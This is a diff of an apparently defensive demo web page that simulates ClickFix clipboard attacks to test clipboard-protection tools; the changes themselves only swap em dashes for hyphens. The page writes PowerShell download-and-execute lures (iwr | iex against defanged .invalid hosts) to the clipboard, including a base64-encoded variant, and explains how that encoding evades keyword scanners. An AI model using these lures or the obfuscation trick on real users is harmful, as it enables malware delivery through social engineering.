@@ -12,7 +12,7 @@
 <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,400;0,9..144,500;0,9..144,600;0,9..144,700;1,9..144,400&family=Hanken+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap">
 <style>
   :root{
-    /* Island-derived palette — light (paper) */
+    /* Island-derived palette - light (paper) */
     --paper:#F1EEEB; --paper-2:#E9E5E0; --card:#FBFAF8;
     --ink:#181B1A; --ink-dim:#535B57; --ink-faint:#8A918C;
     --line:#DAD5CE; --line-soft:#E6E1DB;
@@ -21,7 +21,7 @@
     --danger:#B23127; --danger-soft:#F6DCD8;
     --warn:#8A6410; --warn-soft:#F4E6C4;
     --safe:#0B7A55; --safe-soft:#D9F6E9;
-    /* fixed authentic OS chrome — never themed, must read as real Windows */
+    /* fixed authentic OS chrome - never themed, must read as real Windows */
     --os-bg:#f3f3f3; --os-chrome:#e6e6e6; --os-text:#1b1b1b; --os-line:#c9c9c9;
     --radius:14px; --radius-sm:8px;
     --shadow:0 1px 2px rgba(10,35,30,.05), 0 12px 30px -16px rgba(10,35,30,.22);
@@ -312,7 +312,7 @@
   <div class="container">
     <span class="banner-dot" aria-hidden="true"></span>
     <p><strong>LIVE CLIPBOARD DEMO.</strong> Clicking “Copy fix command” performs a real
-    <code>navigator.clipboard</code> write — the same mechanism ClickFix payloads use — so clipboard
+    <code>navigator.clipboard</code> write - the same mechanism ClickFix payloads use - so clipboard
     protection has something genuine to intercept. No command here ever runs on its own; only a person
     manually pasting into a real Run or terminal window could do that, and this page cannot trigger that step.</p>
   </div>
@@ -482,7 +482,7 @@
             '<li>3. Press <b>Windows key + R</b>, then <b>Ctrl + V</b>, then <b>Enter</b></li>'+
           '</ol>'+
           '<div class="payload-box" id="manualPayload"></div>'+
-          '<span class="payload-cap">↑ no button — the copy only happens when <b>you</b> press Ctrl+C</span>'+
+          '<span class="payload-cap">↑ no button - the copy only happens when <b>you</b> press Ctrl+C</span>'+
           '<div class="log" id="logHost"></div>'+
         '</div>',
       command: 'powershell -w hidden -c "iwr -useb hxxps://acct-confirm[.]invalid/login.ps1 | iex"',
@@ -514,14 +514,14 @@
           '<div class="log" id="logHost"></div>'+
         '</div>',
       command: 'powershell -nop -w hidden -c "iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(\'aXdyIC11c2ViIGh4eHBzOi8vdmVyaWZ5LWNkblsuXWludmFsaWQvcnVuLnBzMQ==\')))"',
-      extraNote: '🧬 Why this one matters for the demo: the malicious URL and the <code style="font-family:var(--mono)">iwr | iex</code> only exist <b>after</b> the base64 is decoded at runtime. A defense that blocks on keyword matches sees a clean-looking blob and lets it through. Catching this needs content inspection that decodes or judges intent — the case for the AI-classifier mode over pattern-matching.',
+      extraNote: '🧬 Why this one matters for the demo: the malicious URL and the <code style="font-family:var(--mono)">iwr | iex</code> only exist <b>after</b> the base64 is decoded at runtime. A defense that blocks on keyword matches sees a clean-looking blob and lets it through. Catching this needs content inspection that decodes or judges intent - the case for the AI-classifier mode over pattern-matching.',
       tokens: [
         {t:'powershell ', flag:false},
-        {t:'-nop', flag:true, note:'“No profile” — skips the user’s PowerShell profile so nothing interferes. A staple of malicious one-liners.'},
-        {t:' -w hidden', flag:true, note:'Hidden window — the console never becomes visible.'},
-        {t:' -c "iex(', flag:true, note:'Invoke-Expression — runs whatever string it is handed as live code.'},
-        {t:'[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(', flag:true, note:'Decodes the base64 blob back into a command AT RUNTIME. This is the obfuscation layer — the real command only exists after this runs.'},
-        {t:'\'aXdyIC11c2ViIGh4eHBz…cnVuLnBzMQ==\'', flag:true, note:'The hidden command, base64-encoded. A scanner that pattern-matches on “iwr”, “| iex”, or a URL sees NONE of them here — just random-looking characters. Decode it and it is: iwr -useb hxxps://verify-cdn[.]invalid/run.ps1'},
+        {t:'-nop', flag:true, note:'“No profile” - skips the user’s PowerShell profile so nothing interferes. A staple of malicious one-liners.'},
+        {t:' -w hidden', flag:true, note:'Hidden window - the console never becomes visible.'},
+        {t:' -c "iex(', flag:true, note:'Invoke-Expression - runs whatever string it is handed as live code.'},
+        {t:'[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(', flag:true, note:'Decodes the base64 blob back into a command AT RUNTIME. This is the obfuscation layer - the real command only exists after this runs.'},
+        {t:'\'aXdyIC11c2ViIGh4eHBz…cnVuLnBzMQ==\'', flag:true, note:'The hidden command, base64-encoded. A scanner that pattern-matches on “iwr”, “| iex”, or a URL sees NONE of them here - just random-looking characters. Decode it and it is: iwr -useb hxxps://verify-cdn[.]invalid/run.ps1'},
         {t:')))"', flag:false}
       ]
     },
@@ -532,10 +532,10 @@
         '<div class="os-body">'+
           '<div class="lure-icon" style="margin:0 0 16px;background:#e7f7ef;color:#0B7A55;">📦</div>'+
           '<h4>Get started with the Acme Starter Kit</h4>'+
-          '<p class="sub">Clone the project and start building. This is an ordinary, legitimate “copy to clipboard” — the kind real sites offer all day.</p>'+
+          '<p class="sub">Clone the project and start building. This is an ordinary, legitimate “copy to clipboard” - the kind real sites offer all day.</p>'+
           '<div class="payload-box" style="color:#0f4f3f;background:#eef7f2;border-color:#bfe0d1;">git clone https://github.com/acme/starter-kit.git</div>'+
           '<button class="copy-btn" data-copy="benign" style="background:#0B7A55;">📋 Copy install command (real clipboard write)</button>'+
-          '<span class="payload-cap">a legitimate copy — the thing the classifier should let through, and blunt API-blocking wrongly stops</span>'+
+          '<span class="payload-cap">a legitimate copy - the thing the classifier should let through, and blunt API-blocking wrongly stops</span>'+
           '<div class="log" id="logHost"></div>'+
         '</div>',
       command: 'git clone https://github.com/acme/starter-kit.git',
@@ -605,11 +605,11 @@
     recheck.addEventListener('click', async function(){
       var c = await readClipboardSafe();
       if (!c.readable){
-        addLogRow('warn', 'Clipboard read denied — cannot verify right now');
+        addLogRow('warn', 'Clipboard read denied - cannot verify right now');
       } else if (c.text === s.command){
-        addLogRow('ok', 'Clipboard holds the raw payload — not intercepted');
+        addLogRow('ok', 'Clipboard holds the raw payload - not intercepted');
       } else if (!c.text){
-        addLogRow('blocked', 'Clipboard is empty — looks quarantined');
+        addLogRow('blocked', 'Clipboard is empty - looks quarantined');
       } else {
         addLogRow('blocked', 'Clipboard differs from payload (currently: "'+c.text.slice(0,40)+'")');
       }
@@ -646,30 +646,30 @@
           copyBtn.textContent = '⛔ Write blocked';
           copyBtn.classList.add('blocked');
           if (s.benign){
-            addLogRow('ok', 'Even this legitimate copy was blocked — API-only mode can’t tell benign from malicious (false positive)');
-            pasteHint.textContent = '↳ a harmless copy got blocked too — the cost of blocking the API without inspecting content';
+            addLogRow('ok', 'Even this legitimate copy was blocked - API-only mode can’t tell benign from malicious (false positive)');
+            pasteHint.textContent = '↳ a harmless copy got blocked too - the cost of blocking the API without inspecting content';
             pasteHint.style.color = 'var(--warn)';
           } else {
-            addLogRow('blocked', 'Write via '+result.method+' — BLOCKED before it reached the clipboard');
-            pasteHint.textContent = '↳ the write was blocked — nothing to paste';
+            addLogRow('blocked', 'Write via '+result.method+' - BLOCKED before it reached the clipboard');
+            pasteHint.textContent = '↳ the write was blocked - nothing to paste';
             pasteHint.style.color = 'var(--safe)';
           }
         } else {
           copyBtn.textContent = s.benign ? '✅ Copied' : '⚠️ Written (verifying…)';
           copyBtn.classList.add('written');
-          addLogRow('warn', 'Write via '+result.method+' — call succeeded, checking what actually landed…');
+          addLogRow('warn', 'Write via '+result.method+' - call succeeded, checking what actually landed…');
           await new Promise(function(r){ setTimeout(r, 300); });
           var check = await readClipboardSafe();
           if (!check.readable){
-            addLogRow('warn', 'Cannot read clipboard back (permission not granted) — write status unconfirmed');
+            addLogRow('warn', 'Cannot read clipboard back (permission not granted) - write status unconfirmed');
           } else if (check.text === s.command){
             addLogRow(s.benign ? 'blocked' : 'ok', s.benign
-              ? 'Clipboard holds the legitimate command — allowed through (correct for a benign copy)'
-              : 'Clipboard contains the raw payload — not intercepted');
+              ? 'Clipboard holds the legitimate command - allowed through (correct for a benign copy)'
+              : 'Clipboard contains the raw payload - not intercepted');
           } else {
             addLogRow('blocked', s.benign
-              ? 'The legitimate command was altered/removed — in API-only mode even benign copies get blocked'
-              : 'Clipboard now differs from the payload (currently: "'+(check.text||'').slice(0,40)+'") — looks quarantined/altered');
+              ? 'The legitimate command was altered/removed - in API-only mode even benign copies get blocked'
+              : 'Clipboard now differs from the payload (currently: "'+(check.text||'').slice(0,40)+'") - looks quarantined/altered');
           }
           pasteHint.textContent = '↳ now click the Run field, then "Paste"';
           pasteHint.style.color = 'var(--safe)';
@@ -683,10 +683,10 @@
       if (payloadEl) payloadEl.textContent = s.command;
       // No "Paste" button here on purpose: that button uses the Clipboard API (readText),
       // which API-blocking protection stops. A manual OS paste (Ctrl+V) is the only path that
-      // mirrors the real attack — so the field is the target, not a button.
+      // mirrors the real attack - so the field is the target, not a button.
       pasteBtn.style.display = 'none';
-      pasteHint.textContent = '↳ select + Ctrl+C, then click the Run field and press Ctrl+V — a real OS paste, no button, nothing for API blocking to catch';
-      addLogRow('warn', 'No script runs here — nothing is written until YOU press Ctrl+C. The “Paste” button is hidden on purpose: it would use the Clipboard API, which API-only blocking stops. Ctrl+V is an OS paste and slips right past it.');
+      pasteHint.textContent = '↳ select + Ctrl+C, then click the Run field and press Ctrl+V - a real OS paste, no button, nothing for API blocking to catch';
+      addLogRow('warn', 'No script runs here - nothing is written until YOU press Ctrl+C. The “Paste” button is hidden on purpose: it would use the Clipboard API, which API-only blocking stops. Ctrl+V is an OS paste and slips right past it.');
       addRecheckButton(s);
       try { runInput.focus({ preventScroll: true }); } catch(e) { runInput.focus(); }
     }
@@ -704,7 +704,7 @@
             '<div class="dr-label">atob(base64) →</div>'+
             '<div class="dr-cmd">'+escapeHtml(decoded)+'</div>'+
             '<div class="dr-note">That random-looking blob was a URL fetch all along. A scanner matching on '+
-            '“iwr”, “iex”, or a URL saw none of them in the encoded form — which is exactly why encoding '+
+            '“iwr”, “iex”, or a URL saw none of them in the encoded form - which is exactly why encoding '+
             'defeats naïve pattern-matching. Paste the base64 into any decoder (e.g. CyberChef → From Base64) '+
             'to confirm this yourself.</div>'+
           '</div>';
@@ -723,15 +723,15 @@
     } else if (check.readable && !check.text){
       runInput.value = '';
       runOk.disabled = true;
-      pasteHint.textContent = '↳ clipboard is empty right now — nothing to paste';
+      pasteHint.textContent = '↳ clipboard is empty right now - nothing to paste';
       pasteHint.style.color = 'var(--safe)';
     } else {
-      pasteHint.textContent = '↳ the “Paste” button uses the Clipboard API, which is blocked/denied here — click the field and press Ctrl+V instead (a real OS paste always works)';
+      pasteHint.textContent = '↳ the “Paste” button uses the Clipboard API, which is blocked/denied here - click the field and press Ctrl+V instead (a real OS paste always works)';
       pasteHint.style.color = 'var(--warn)';
     }
   });
 
-  // Native Ctrl+V (or typing) into the Run field — an OS paste that needs no Clipboard API.
+  // Native Ctrl+V (or typing) into the Run field - an OS paste that needs no Clipboard API.
   // This is the authentic path and the one that proves the manual-copy blind spot.
   runInput.addEventListener('input', function(){
     var v = runInput.value.trim();
@@ -749,12 +749,12 @@
 
     if (s.benign){
       var arrived = pasted === s.command;
-      html += '<div class="headline safe"><span class="badge">✓</span> Legitimate command — this should be allowed through</div>';
+      html += '<div class="headline safe"><span class="badge">✓</span> Legitimate command - this should be allowed through</div>';
       html += '<div class="cmd-annotated" style="color:#CFE0D8;">'+escapeHtml(pasted || '(clipboard was empty)')+'</div>';
       if (arrived){
-        html += '<div class="note safe">✅ A normal “copy to clipboard” — cloning a public repo, no interpreter, no download-and-execute. The <b>AI Classifier</b> should let this through untouched, and it did (it’s sitting in the field). <b>Clipboard API Only</b> mode blocks even this, because it stops the mechanism without reading the content — the false-positive cost the classifier exists to avoid.</div>';
+        html += '<div class="note safe">✅ A normal “copy to clipboard” - cloning a public repo, no interpreter, no download-and-execute. The <b>AI Classifier</b> should let this through untouched, and it did (it’s sitting in the field). <b>Clipboard API Only</b> mode blocks even this, because it stops the mechanism without reading the content - the false-positive cost the classifier exists to avoid.</div>';
       } else {
-        html += '<div class="note warn">This harmless command didn’t arrive intact. In <b>Clipboard API Only</b> mode that’s expected — it blocks every programmatic copy, legitimate ones included. That collateral damage is the whole reason a content-aware mode exists.</div>';
+        html += '<div class="note warn">This harmless command didn’t arrive intact. In <b>Clipboard API Only</b> mode that’s expected - it blocks every programmatic copy, legitimate ones included. That collateral damage is the whole reason a content-aware mode exists.</div>';
       }
       html += '</div>';
       breakdownPanel.innerHTML = html;
@@ -773,17 +773,17 @@
       html += '</div>';
       html += '<ul class="flag-list">';
       s.tokens.filter(function(t){ return t.flag; }).forEach(function(t){
-        html += '<li><span class="chip">FLAG</span><span><b>'+escapeHtml(t.t.trim())+'</b> — '+t.note+'</span></li>';
+        html += '<li><span class="chip">FLAG</span><span><b>'+escapeHtml(t.t.trim())+'</b> - '+t.note+'</span></li>';
       });
       html += '</ul>';
       if (s.extraNote){
         html += '<div class="note warn">'+s.extraNote+'</div>';
       }
-      html += '<div class="note warn">⚠️ This payload made it all the way to the clipboard unmodified. In a real ClickFix attack, this is the exact moment the target presses Enter and the command runs — no further clicks, no confirmation dialog. This page still cannot execute it for you.</div>';
+      html += '<div class="note warn">⚠️ This payload made it all the way to the clipboard unmodified. In a real ClickFix attack, this is the exact moment the target presses Enter and the command runs - no further clicks, no confirmation dialog. This page still cannot execute it for you.</div>';
     } else {
       html += '<div class="headline safe"><span class="badge">✓</span> The malicious payload never reached this dialog</div>';
       html += '<div class="cmd-annotated">'+escapeHtml(pasted || '(clipboard was empty)')+'</div>';
-      html += '<div class="note safe">🛡️ Whatever you pasted here does not match the intended payload — that means something between the copy step and this dialog already intercepted or quarantined it. That interception is the thing worth showing in a live demo.</div>';
+      html += '<div class="note safe">🛡️ Whatever you pasted here does not match the intended payload - that means something between the copy step and this dialog already intercepted or quarantined it. That interception is the thing worth showing in a live demo.</div>';
     }
     html += '</div>';
     breakdownPanel.innerHTML = html;
